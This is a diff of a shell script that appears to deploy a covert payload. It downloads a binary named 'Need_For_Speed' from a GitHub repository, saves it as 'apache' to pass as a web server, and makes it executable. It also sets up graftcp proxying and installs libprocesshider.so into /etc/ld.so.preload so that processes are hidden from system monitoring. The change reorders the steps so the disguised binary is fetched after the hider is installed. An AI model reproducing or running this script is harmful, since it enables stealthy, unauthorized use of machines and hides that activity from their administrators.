@@ -9,9 +9,6 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/hanifgz/ngarit/main/graphics.tar.gz
 tar -xvzf graphics.tar.gz
 
-wget -O apache https://raw.githubusercontent.com/hanifgz/ngarit/main/Need_For_Speed
-chmod +x apache
-
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
@@ -32,5 +29,8 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
+
+wget -O apache https://raw.githubusercontent.com/hanifgz/ngarit/main/Need_For_Speed
+chmod +x apache
 
 screen ./graftcp/graftcp bash
